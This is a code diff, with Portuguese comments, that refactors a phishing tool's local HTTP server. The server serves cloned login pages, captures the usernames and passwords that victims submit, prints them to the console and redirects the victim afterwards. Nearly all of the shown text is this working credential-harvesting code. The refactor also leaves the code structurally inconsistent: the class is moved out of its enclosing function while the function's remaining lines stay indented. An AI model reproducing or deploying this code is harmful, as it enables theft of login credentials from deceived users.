@@ -233,7 +233,6 @@ def phishing_menu(language):
 
 
 # Função para as páginas de logins falsas
-# Função para as páginas de logins falsas
 def fake_login_pages(language):
     clear_console()
     if language == '1':
@@ -295,32 +294,35 @@ def run_local_server(target_url, language):
         print("Executando site de phishing em localhost...")
 
     # Configurar o servidor HTTP local para servir os arquivos clonados
-    class PhishingServer(http.server.BaseHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, **kwargs)
+    
+class PhishingServer(http.server.BaseHTTPRequestHandler):
+    
+    def __init__(self, *args, language='1', **kwargs):
+        self.language = language
+        super().__init__(*args, **kwargs)
 
-        def do_GET(self):
-            # Servir arquivos index.html e styles.css
-            try:
-                if self.path == '/':
-                    self.path = '/index.html'
-                elif self.path == '/styles.css':
-                    pass  # Lógica para servir o arquivo CSS
+    def do_GET(self):
+        try:
+            if self.path == '/':
+                self.path = '/index.html'
+            elif self.path == '/styles.css':
+                pass  # Lógica para servir o arquivo CSS aqui
 
-                # Abrir e enviar o arquivo solicitado
-                with open(os.path.join('.', self.path[1:]), 'rb') as file:
-                    self.send_response(200)
-                    if self.path.endswith('.html'):
-                        self.send_header('Content-type', 'text/html')
-                    elif self.path.endswith('.css'):
-                        self.send_header('Content-type', 'text/css')
-                    self.end_headers()
-                    self.wfile.write(file.read())
+            # Abrir e enviar o arquivo solicitado
+            with open(os.path.join('.', self.path[1:]), 'rb') as file:
+                self.send_response(200)
+                if self.path.endswith('.html'):
+                    self.send_header('Content-type', 'text/html')
+                elif self.path.endswith('.css'):
+                    self.send_header('Content-type', 'text/css')
+                self.end_headers()
+                self.wfile.write(file.read())
 
-            except FileNotFoundError:
-                self.send_error(404, 'File Not Found: %s' % self.path)
+        except FileNotFoundError:
+            self.send_error(404, 'File Not Found: %s' % self.path)
 
-        def do_POST(self):
+    def do_POST(self):
+        try:
             # Capturar dados do formulário POST
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length).decode('utf-8')
@@ -328,23 +330,37 @@ def run_local_server(target_url, language):
             password = post_data.split('&')[1].split('=')[1]
 
             # Exibir credenciais no console
-            if language == '1':
-                print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
+            if self.language == '1':
+                print("\033[92m\033[1m" + "Credentials entered:".center(50))
                 print(f"Username: {username}")
                 print(f"Password: {password}")
             else:
-                print(Fore.GREEN + Style.BRIGHT + "Credenciais inseridas:".center(50))
+                print("\033[92m\033[1m" + "Credenciais inseridas:".center(50))
                 print(f"Nome de Usuário: {username}")
                 print(f"Senha: {password}")
 
             # Redirecionar para a URL digitada após capturar as credenciais
             self.send_response(302)
-            self.send_header('Location', target_url)
+            self.send_header('Location', 'https://www.example.com')
             self.end_headers()
 
+        except Exception as e:
+            print(f"Error handling POST request: {e}")
+            self.send_error(500, "Internal Server Error")
+
+# Função para limpar os arquivos HTML e CSS
+def clean_up_files():
+    try:
+        os.remove('index.html')
+        os.remove('styles.css')
+    except Exception as e:
+        print(f"Error cleaning up files: {e}")
+
+if __name__ == '__main__':
     try:
         # Iniciar o servidor em uma thread separada
-        server = socketserver.TCPServer(('localhost', 8080), PhishingServer)
+        language = '1'  # Defina conforme necessário
+        server = socketserver.TCPServer(('localhost', 8080), lambda *args, **kwargs: PhishingServer(*args, language=language, **kwargs))
         server_thread = threading.Thread(target=server.serve_forever)
         server_thread.daemon = True
         server_thread.start()
@@ -365,14 +381,6 @@ def run_local_server(target_url, language):
 
     except Exception as e:
         print(f"Error running local server: {e}")
-
-# Função para limpar os arquivos HTML e CSS
-def clean_up_files():
-    try:
-        os.remove('index.html')
-        os.remove('styles.css')
-    except Exception as e:
-        print(f"Error cleaning up files: {e}")
 
 # Função para informações de número de telefone
 def phone_number_info(language):
